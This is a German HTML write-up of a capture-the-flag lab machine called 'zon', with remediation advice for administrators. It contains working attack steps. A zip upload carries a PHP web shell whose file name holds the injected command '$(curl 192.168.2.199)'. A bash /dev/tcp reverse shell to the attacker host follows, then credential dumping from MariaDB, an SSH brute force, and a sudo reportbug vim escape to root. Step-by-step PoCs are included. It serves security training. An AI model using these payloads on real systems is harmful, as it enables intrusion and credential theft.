+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">vi '$(curl 192.168.2.199).php'</span></div>
+                     <!-- Inhalt der Datei angenommen:  echo system($GET['cmd']); -->
+                 </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">zip testcrack2.zip '$(curl 192.168.2.199).php'</span></div>
+                     <pre>
+  adding: $(curl 192.168.2.199).php (stored 0%)
+                    </pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Hier wird ein Trick angewendet.
+1.  `$(curl 192.168.2.199)`: Dieser Teil wird von der lokalen Shell des Angreifers ausgeführt. Es wird angenommen, dass auf dem Angreifer-System (192.168.2.199) ein einfacher Webserver läuft, der bei Aufruf nur einen String zurückgibt (z.B. "payload"). Das Ergebnis dieses Befehls wird Teil des Dateinamens.
+2.  `vi 'payload.php'`: Eine Datei wird erstellt (z.B. `payload.php`), die wahrscheinlich die einfache Web-Shell (`echo system($GET['cmd']);`) enthält.
+3.  `zip testcrack2.zip 'payload.php'`: Die Datei wird in `testcrack2.zip` gepackt. Der entscheidende Punkt ist, dass der *Dateiname selbst* jetzt das Ergebnis des `curl`-Befehls enthält (hier als `$(curl 192.168.2.199).php` dargestellt, was bedeutet, dass der Dateiname im ZIP-Archiv buchstäblich `$(curl 192.168.2.199).php` heißt).
+</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein Versuch einer Command Injection über den Dateinamen. Die Hoffnung ist, dass die serverseitige Entpackungslogik den Dateinamen unsicher behandelt und versucht, `$(curl 192.168.2.199)` als Befehl auszuführen, wenn die Datei entpackt wird.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <!-- Kein Befehl, URL wird aufgerufen --> 
+                     <pre>
+http://zon.hmv/uploads/$(curl%20192.168.2.199).php?cmd=id
+<span class="command">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+                     </pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Nach dem Upload der präparierten ZIP-Datei (`testcrack2.zip`) wird versucht, die (vermutlich) entpackte Datei direkt über eine URL aufzurufen. Die URL enthält den speziellen Dateinamen mit URL-kodierten Klammern und Leerzeichen (`$(curl%20192.168.2.199).php`) und den Parameter `?cmd=id`. Die Ausgabe `uid=33(www-data)` zeigt, dass der Webserver diesen Request verarbeitet, die Datei findet und die Web-Shell darin ausführt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolg! Die Kombination aus dem speziellen Dateinamen (der die Upload-Filter umging oder dessen Entpackung die Command Injection nicht auslöste, sondern die Datei einfach mit diesem Namen erstellte) und dem direkten Aufruf der Web-Shell ermöglichte Remote Code Execution als `www-data`.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 5555</span></div>
+                     <pre>
+listening on [any] 5555 ...
+                     </pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                      <!-- Kein Befehl, URL wird aufgerufen -->
+                     <pre>
+Payload = http://zon.hmv/uploads/$(curl%20192.168.2.199).php?cmd=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.2.199%2F5555%200%3E%261%27
+                     </pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 5555</span></div>
+                      <pre>
+listening on [any] 5555 ...
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.104] 50264</span>
+bash: cannot set terminal process group (595): Inappropriate ioctl for device
+bash: no job control in this shell
+                      </pre>
+                      <!-- Prompt der www-data Shell -->
+                      <div class="prompt">www-data@zon:/var/www/html/uploads$</div>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein Netcat-Listener wird auf Port `5555` gestartet. Anschließend wird die Web-Shell-URL mit einem URL-kodierten Reverse-Shell-Payload im `cmd`-Parameter aufgerufen. Der Listener empfängt die Verbindung vom Zielserver, und wir erhalten eine Shell als `www-data`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der initiale Zugriff über RCE wurde erfolgreich zu einer interaktiven Reverse Shell umgewandelt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stabilisieren Sie die Shell (Python PTY etc.). Beginnen Sie mit der Enumeration als `www-data`.
+<br><strong>Empfehlung (Admin):</strong> Beheben Sie die Upload-Schwachstelle und die Möglichkeit, beliebige Dateien im Web-Root abzulegen und auszuführen.</p>
+            <!-- Initial Access Inhalt endet hier -->
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+            <!-- Privilege Escalation Inhalt beginnt hier -->
+             <p class="analysis"><strong>Strategie Teil 1: Von `www-data` zu `freddie`</strong></p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@zon:/var/www/html/uploads$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div>
+                     <pre>
+   <span class="command">914041     88 -rwsr-xr-x   1 root     root        88496 Mar 23  2023 /usr/bin/gpasswd</span>
+   <span class="command">914042     68 -rwsr-xr-x   1 root     root        68248 Mar 23  2023 /usr/bin/passwd</span>
+   <span class="command">923844    276 -rwsr-xr-x   1 root     root       281624 Jun 27  2023 /usr/bin/sudo</span>
+   <span class="command">917500     48 -rwsr-xr-x   1 root     root        48896 Mar 23  2023 /usr/bin/newgrp</span>
+   <span class="command">914039     52 -rwsr-xr-x   1 root     root        52880 Mar 23  2023 /usr/bin/chsh</span>
+   <span class="command">918251     72 -rwsr-xr-x   1 root     root        72000 Mar 23  2023 /usr/bin/su</span>
+   <span class="command">917654     60 -rwsr-xr-x   1 root     root        59704 Mar 23  2023 /usr/bin/mount</span>
+   <span class="command">914038     64 -rwsr-xr-x   1 root     root        62672 Mar 23  2023 /usr/bin/chfn</span>
+   <span class="command">917656     36 -rwsr-xr-x   1 root     root        35128 Mar 23  2023 /usr/bin/umount</span>
+   <span class="command">953128    396 -rwsr-xr--   1 root     dip        403832 May 14  2022 /usr/sbin/pppd</span>
+   <span class="command">916137     52 -rwsr-xr--   1 root     messagebus    51272 Sep 16 12:03 /usr/lib/dbus-1.0/dbus-daemon-launch-helper</span>
+   <span class="command">918818    640 -rwsr-xr-x   1 root     root         653888 Sep 24 00:11 /usr/lib/openssh/ssh-keysign</span>
+  <span class="command">1046954     20 -rwsr-xr-x   1 root     root          18664 Jan 31  2023 /usr/lib/polkit-1/polkit-agent-helper-1</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Die Suche nach SUID-Dateien wird durchgeführt. Es werden hauptsächlich Standard-Linux-Binaries gefunden. `/usr/sbin/pppd` ist interessant, aber oft schwer auszunutzen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Kein offensichtlicher, einfacher Exploit über SUID-Binaries sichtbar.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@zon:/var/www/html/uploads$ <span class="command">ls /home/</span></div>
+                     <pre><span class="command">freddie</span></pre>
+                 </div>
+            </div>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@zon:/var/www/html/uploads$ <span class="command">cd /home/freddie/</span></div>
+                      <pre><span class="password">bash: cd: /home/freddie/: Permission denied</span></pre>
+                  </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Benutzer `freddie` wird im `/home`-Verzeichnis entdeckt. Der Zugriff auf sein Home-Verzeichnis ist für `www-data` jedoch nicht erlaubt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt die Existenz des Benutzers `freddie`, aber direkter Zugriff auf seine Dateien ist nicht möglich.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">www-data@zon:/var/www/html$ <span class="command">ls -la</span></div>
+                     <pre>[...]
+<span class="command">-rwxr-xr-x 1 www-data www-data   698 Nov 30 07:15 hashDB.sh</span>
+[...]
+                     </pre>
+                      <div class="prompt">www-data@zon:/var/www/html$ <span class="command">cat hashDB.sh</span></div>
+                      <pre>
+<!-- Shebang entfernt -->
+
+# script that checks the database's integrity every minute
+
+dump=/dev/shm/dump.sql
+log=/var/log/db_integrity_check.log
+true > "${log}"
+
+<span class="command">/usr/bin/mysqldump -u admin -p<span class="password">udgrJbFc6Av#U3</span> admin credentials > "${dump}"</span>
+/usr/bin/sed -i '$d' "${dump}"
+
+hash="29d8e6b76aab0254f7fe439a6a5d2fba64270dde087e6dfab57fa57f6749858a"
+check_hash=$(sha256sum "${dump}" | awk '{print $1}')
+
+if [[ "${hash}" != "${check_hash}" ]] ; then
+  /usr/bin/wall "Alert ! Database hacked !"
+  /usr/bin/du -sh /var/lib/mysql >> "${log}"
+  /usr/bin/vmstat 1 3 >> "${log}"
+else
+  /usr/bin/sync && /usr/bin/echo 3 > /proc/sys/vm/drop_caches
+  /usr/bin/echo "$(date) : Integrity check completed for ${dump}" >> "${log}"
+fi
+                     </pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Im Web-Root `/var/www/html` wird ein Shell-Skript `hashDB.sh` gefunden. Das Skript führt einen `mysqldump` der Tabelle `credentials` aus der Datenbank `admin` durch, wobei die Zugangsdaten `admin:<span class="password">udgrJbFc6Av#U3</span>` im Klartext verwendet werden. Es vergleicht dann den Hash des Dumps mit einem erwarteten Hash und führt Aktionen basierend auf dem Ergebnis aus (Warnung oder Cache leeren).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Kritischer Fund! Hardcodierte Datenbank-Zugangsdaten in einem Skript im Web-Root. Diese Credentials können verwendet werden, um auf die MariaDB-Datenbank zuzugreifen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie die gefundenen Credentials (`admin:udgrJbFc6Av#U3`), um sich mit der lokalen MariaDB-Datenbank zu verbinden und nach weiteren interessanten Informationen (z.B. Benutzerpasswörtern) zu suchen.
+<br><strong>Empfehlung (Admin):</strong> Speichern Sie niemals Zugangsdaten im Klartext in Skripten. Verwenden Sie sicherere Methoden wie Konfigurationsdateien mit eingeschränkten Berechtigungen oder Datenbank-Authentifizierungsmethoden, die keine Klartextpasswörter erfordern.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">hydra -l freddie -P /usr/share/wordlists/rockyou.txt ssh://192.168.2.104:22 -t 64</span></div>
+                      <pre>
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-24 21:48:57
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344491 login tries (l:1/p:14344491), ~224133 tries per task
+[DATA] attacking ssh://192.168.2.104:22/
+[STATUS] 333.00 tries/min, 333 tries in 00:01h, 14344190 to do in 717:56h, 32 active
+^C<span class="password">The session file ./hydra.restore was written. Type "hydra -R" to resume session.</span>
+                      </pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Es wird versucht, das SSH-Passwort für den Benutzer `freddie` mit Hydra und der `rockyou.txt`-Liste zu knacken. Der Angriff wird nach kurzer Zeit abgebrochen (`^C`).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Brute-Force-Versuch war nicht erfolgreich (oder wurde zu früh abgebrochen). SSH-Brute-Force ist oft langsam und ineffizient.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Konzentrieren Sie sich auf die gefundenen Datenbank-Credentials.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">www-data@zon:/var/www/html$ <span class="command">mysql -u admin -pudgrJbFc6Av#U3</span></div>
+                     <pre>
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 31
+Server version: 10.11.4-MariaDB-1~deb12u1 Debian 12
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+                    </pre>
+                     <div class="prompt">MariaDB [(none)]></div>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Mit den aus `hashDB.sh` extrahierten Zugangsdaten wird erfolgreich eine Verbindung zur lokalen MariaDB-Datenbank hergestellt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Datenbankzugriff als Benutzer `admin` erlangt.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">MariaDB [(none)]> <span class="command">show databases;</span></div>
+                      <pre>
++--------------------+
+| Database           |
++--------------------+
+| admin              |
+| information_schema |
+| mysql              |
+| performance_schema |
+| sys                |
++--------------------+
+5 rows in set (0.001 sec)
+                     </pre>
+                       <div class="prompt">MariaDB [(none)]> <span class="command">use admin;</span></div>
+                       <pre>
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+                      </pre>
+                       <div class="prompt">MariaDB [admin]> <span class="command">show tables;</span></div>
+                       <pre>
++-----------------+
+| Tables_in_admin |
++-----------------+
+| credentials     |
++-----------------+
+1 row in set (0.000 sec)
+                      </pre>
+                       <div class="prompt">MariaDB [admin]> <span class="command">select * from credentials;</span></div>
+                       <pre>
++----------+-------------------------+
+| username | password                |
++----------+-------------------------+
+| <span class="command">Freddie</span>  | <span class="password">LDVK@dYiEa2I1lnjrEeoMif</span> |
++----------+-------------------------+
+                      </pre>
+                      <div class="prompt">MariaDB [admin]></div>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Innerhalb der Datenbank werden die Datenbanken aufgelistet (`show databases;`). Die Datenbank `admin` wird ausgewählt (`use admin;`). Die Tabellen darin werden aufgelistet (`show tables;`), es gibt nur die Tabelle `credentials`. Der Inhalt dieser Tabelle wird abgefragt (`select * from credentials;`), und es wird ein Eintrag für den Benutzer `Freddie` mit dem Passwort `<span class="password">LDVK@dYiEa2I1lnjrEeoMif</span>` gefunden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Kritischer Fund! Das Passwort für den Systembenutzer `freddie` wurde in der Datenbank gefunden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie das gefundene Passwort `LDVK@dYiEa2I1lnjrEeoMif`, um sich als Benutzer `freddie` auf dem System anzumelden (z.B. über `su freddie` oder SSH, falls möglich).
+<br><strong>Empfehlung (Admin):</strong> Speichern Sie Systempasswörter niemals (auch nicht für andere Benutzer) in Datenbanken, auf die der Webserver-Prozess Zugriff hat. Verwenden Sie separate, starke Passwörter für Datenbankbenutzer und Systembenutzer. Hashen Sie Passwörter auch innerhalb von Datenbanken, wenn möglich.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@zon:/var/www/html$ <span class="command">su freddie</span></div>
+                     <pre>
+Password: <span class="password">LDVK@dYiEa2I1lnjrEeoMif</span>
+
+[oh-my-zsh] Would you like to update? [Y/n] y
+[...]
+<span class="password">Hooray! Oh My Zsh has been updated!</span>
+[...]
+                     </pre>
+                     <!-- Zsh Prompt von Freddie -->
+                      <div class="prompt">╭─freddie@zon /var/www/html
+╰─$</div>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Mit dem Befehl `su freddie` und dem aus der Datenbank extrahierten Passwort wird erfolgreich zum Benutzer `freddie` gewechselt. Freddie verwendet die Zsh-Shell mit Oh My Zsh.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die erste Stufe der Rechteausweitung (von `www-data` zu `freddie`) ist erfolgreich abgeschlossen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Zsh Prompt -->
+                      <div class="prompt">╭─freddie@zon /var/www/html
+╰─$ <span class="command">cd ~</span></div>
+                      <div class="prompt">╭─freddie@zon ~
+╰─$ <span class="command">ls</span></div>
+                      <pre>user.txt</pre>
+                      <div class="prompt">╭─freddie@zon ~
+╰─$ <span class="command">cat user.txt</span></div>
+                      <pre><span class="password">a0b4603c7fde7e4113d2ee5fbee5a038</span></pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Im Home-Verzeichnis von `freddie` wird die `user.txt`-Datei gefunden und das User-Flag ausgelesen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> User-Flag erfolgreich erfasst.</p>
+
+             <p class="analysis"><strong>Strategie Teil 2: Von `freddie` zu `root`</strong></p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">╭─freddie@zon ~
+╰─$ <span class="command">sudo -u root /usr/bin/reportbug</span></div>
+                      <pre>
+[...]
+<span class="password">Report will be sent to team@security.debian.org</span>
+Submit this report on www.debian.org (e to edit) [y|n|a|c|E|i|l|m|p|q|d|t|?]?
+                      </pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Benutzer `freddie` führt `/usr/bin/reportbug` mit `sudo -u root` aus. Dies impliziert, dass `freddie` (über `sudo -l`, nicht gezeigt) die Berechtigung hat, `reportbug` als `root` auszuführen. `reportbug` startet einen interaktiven Prozess zur Meldung eines Fehlers.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein bekannter Vektor zur Rechteausweitung. Viele interaktive Programme, die mit erhöhten Rechten ausgeführt werden, erlauben das Ausführen von Shell-Befehlen oder das Öffnen eines Editors, was dann ebenfalls mit den erhöhten Rechten geschieht.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+:set shell=/bin/bash
+                     </pre>
+                      <div class="prompt">Subject: www.debian.org: the vim is not open
+Package: www.debian.org
+Severity: normal
+Tags: security patch</div>
+                       <pre>
+# <span class="command">ls</span>
+<span class="command">root.txt</span>
+# <span class="command">cat root.txt</span>
+<span class="password">18a72aa09ce61fb487fd6745c8eba769</span>
+                       </pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Innerhalb der `reportbug`-Sitzung (die wahrscheinlich `vim` oder einen ähnlichen Editor öffnet), wird der Editor so konfiguriert, dass er `/bin/bash` als Shell verwendet (`:set shell=/bin/bash`). Anschließend wird aus dem Editor heraus ein Shell-Befehl ausgeführt (oft mit `!befehl` oder einem ähnlichen Mechanismus). Hier werden `ls` und `cat root.txt` ausgeführt. Da `reportbug` als `root` lief, laufen diese Befehle ebenfalls als `root`. Die `root.txt` wird erfolgreich angezeigt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Rechteausweitung mittels `sudo reportbug` war erfolgreich. Durch das Ausnutzen der Möglichkeit, Shell-Befehle aus dem von `reportbug` gestarteten Editor auszuführen, konnten Root-Rechte erlangt und das Root-Flag gelesen werden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Dies ist ein klassischer GTFOBins-Fall. Dokumentieren Sie die `sudo`-Regel und die Ausnutzung über `:set shell` und `!command`.
+<br><strong>Empfehlung (Admin):</strong> Überprüfen Sie `sudo`-Regeln sorgfältig. Vermeiden Sie es, Benutzern die Ausführung von interaktiven Programmen oder Editoren als `root` zu erlauben, wenn dies nicht absolut notwendig ist. Wenn es doch nötig ist, konfigurieren Sie `sudo` so, dass Shell-Escapes verhindert werden (z.B. mit `sudo -e` für Editoren oder spezifischeren Einschränkungen).</p>
+            <!-- Privilege Escalation Inhalt endet hier -->
+        </section>
+
+        <section id="poc">
+            <h2>Proof of Concept</h2>
+            <p class="analysis"><strong>POC 1: RCE via File Upload und Command Injection in Filename</strong></p>
+            <p class="evaluation"><strong>Kurzbeschreibung:</strong> Die Anwendung unter `upload.php` erlaubt das Hochladen von ZIP-Dateien. Obwohl sie versucht, Nicht-JPEG-Dateien zu filtern, kann der Filter durch eine doppelte Endung (`.php.jpeg`) umgangen werden. Entscheidender ist jedoch, dass der Dateiname beim Entpacken auf dem Server unsicher behandelt wird (oder der Webserver Dateinamen mit Shell-Metacharacteren erlaubt und die Webshell im Dateinamen korrekt interpretiert). Durch das Hochladen einer ZIP-Datei, die eine PHP-Web-Shell mit einem speziellen Dateinamen wie `$(curl [Angreifer-IP]).php` enthält, und anschließendes Aufrufen dieser Datei über eine URL mit einem `cmd`-Parameter, kann Remote Code Execution als `www-data` erlangt werden.</p>
+            <p class="analysis"><strong>Voraussetzungen:</strong>
+                <ul>
+                    <li>Zugriff auf die Upload-Funktion (`http://zon.hmv/upload.php`).</li>
+                    <li>Ein Webserver auf dem Angreifer-System, der auf `curl [Angreifer-IP]` einen einfachen String zurückgibt (z.B. "shell").</li>
+                    <li>Eine einfache PHP-Web-Shell (z.B. `<!-- PHP Tags entfernt --> echo system($GET['cmd']);`).</li>
+                    <li>Ein Tool zum Erstellen von ZIP-Dateien.</li>
+                </ul>
+            </p>
+            <p class="analysis"><strong>Schritt-für-Schritt Anleitung:</strong>
+                <ol>
+                    <li>Erstelle die PHP-Web-Shell-Datei lokal mit dem dynamischen Namen (z.B. `vi '$(curl [Angreifer-IP]).php'`).</li>
+                    <li>Erstelle eine ZIP-Datei, die diese Datei enthält (z.B. `zip exploit.zip '$(curl [Angreifer-IP]).php'`).</li>
+                    <li>Lade die `exploit.zip`-Datei über `http://zon.hmv/upload.php` hoch.</li>
+                    <li>Rufe die URL im Browser auf, um einen Befehl auszuführen (ersetze `[...]` durch den dynamischen Teil und URL-kodiere ihn): `http://zon.hmv/uploads/[...].php?cmd=[Befehl]` (z.B. `cmd=id`).</li>
+                </ol>
+            </p>
+             <p class="evaluation"><strong>Erwartetes Ergebnis:</strong> Der Befehl im `cmd`-Parameter wird als `www-data` ausgeführt und die Ausgabe im Browser angezeigt.</p>
+             <p class="recommendation"><strong>Beweismittel:</strong> Die Ausgabe des `id`-Befehls (`uid=33(www-data)...`) bei Aufruf der URL.</p>
+             <p class="recommendation"><strong>Risikobewertung:</strong> Hoch. Diese Schwachstelle ermöglicht direkte RCE als Webserver-Benutzer.</p>
+             <p class="recommendation"><strong>Empfehlungen (Admin):</strong>
+                 <ul>
+                    <li>Implementieren Sie eine robuste Validierung für Dateinamen beim Upload und Entpacken. Sanitisieren Sie Dateinamen, um Metacharacter zu entfernen.</li>
+                    <li>Überprüfen Sie Dateiinhalte serverseitig auf Gültigkeit (z.B. tatsächliche Bilddaten prüfen, nicht nur Endung oder Magic Bytes).</li>
+                    <li>Speichern Sie Uploads außerhalb des Web-Roots oder in Verzeichnissen ohne Ausführungsrechte.</li>
+                 </ul>
+             </p>
+
+             <hr/>
+
+            <p class="analysis"><strong>POC 2: Privilege Escalation via `sudo reportbug`</strong></p>
+            <p class="evaluation"><strong>Kurzbeschreibung:</strong> Der Benutzer `freddie` hat die `sudo`-Berechtigung, `/usr/bin/reportbug` als `root` auszuführen. Da `reportbug` einen Editor (wie `vim`) startet, kann diese Berechtigung missbraucht werden, um Root-Rechte zu erlangen. Innerhalb des Editors kann die verwendete Shell auf `/bin/bash` geändert und anschließend beliebige Befehle über die Editor-Shell-Funktion (`!command`) als `root` ausgeführt werden.</p>
+             <p class="analysis"><strong>Voraussetzungen:</strong>
+                <ul>
+                    <li>Zugriff als Benutzer `freddie` (z.B. per SSH oder `su`).</li>
+                    <li>Die spezifische `sudo`-Regel, die `freddie` erlaubt, `reportbug` als `root` auszuführen.</li>
+                </ul>
+             </p>
+             <p class="analysis"><strong>Schritt-für-Schritt Anleitung:</strong>
+                 <ol>
+                     <li>Als Benutzer `freddie`: Führe `sudo -u root /usr/bin/reportbug` aus.</li>
+                     <li>Interagiere mit `reportbug`, bis ein Editor (vermutlich `vim`) geöffnet wird, um den Fehlerbericht zu bearbeiten.</li>
+                     <li>Im Editor (vim): Gib den Befehl `:set shell=/bin/bash` ein und drücke Enter.</li>
+                     <li>Im Editor (vim): Gib den Befehl `:!id` (oder einen anderen gewünschten Befehl wie `:!whoami` oder `:!bash`) ein und drücke Enter.</li>
+                 </ol>
+             </p>
+             <p class="evaluation"><strong>Erwartetes Ergebnis:</strong> Der Befehl (`id`) wird als `root` ausgeführt und die Ausgabe (`uid=0(root)...`) wird im Editor angezeigt.</p>
+             <p class="recommendation"><strong>Beweismittel:</strong> Die Ausgabe von `:!id` zeigt Root-Rechte.</p>
+             <p class="recommendation"><strong>Risikobewertung:</strong> Hoch. Eine scheinbar harmlose `sudo`-Regel ermöglicht die vollständige Übernahme des Systems.</p>
+             <p class="recommendation"><strong>Empfehlungen (Admin):</strong>
+                 <ul>
+                    <li>Überprüfen Sie `sudo`-Regeln äußerst sorgfältig, insbesondere solche, die die Ausführung interaktiver Programme oder Editoren erlauben.</li>
+                    <li>Verwenden Sie spezifischere `sudo`-Regeln, die nur die absolut notwendigen Befehle/Skripte erlauben.</li>
+                    <li>Wenn das Bearbeiten von Dateien als anderer Benutzer erlaubt werden muss, verwenden Sie `sudoedit` (`sudo -e`), was sicherer ist als die direkte Ausführung eines Editors.</li>
+                    <li>Entfernen Sie die `sudo`-Berechtigung für `reportbug`, wenn sie nicht zwingend erforderlich ist.</li>
+                 </ul>
+             </p>
+        </section>
+
+        <!-- Flags Section (Korrekte Struktur gemäß Regeln) -->
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/freddie/user.txt</div> <!-- Pfad korrigiert -->
+                    <div class="flag-value"><span class="password">a0b4603c7fde7e4113d2ee5fbee5a038</span></div> <!-- Flag aus Text -->
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/root.txt</div> <!-- Pfad korrigiert -->
+                    <div class="flag-value"><span class="password">18a72aa09ce61fb487fd6745c8eba769</span></div> <!-- Flag aus Text -->
+                </div>
+            </div>
+        </section>
+        <!-- Ende Flags Section -->
+  
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 24. Januar 2024</p> <!-- Datum eingefügt -->
+    </footer>
+</body>
+</html>
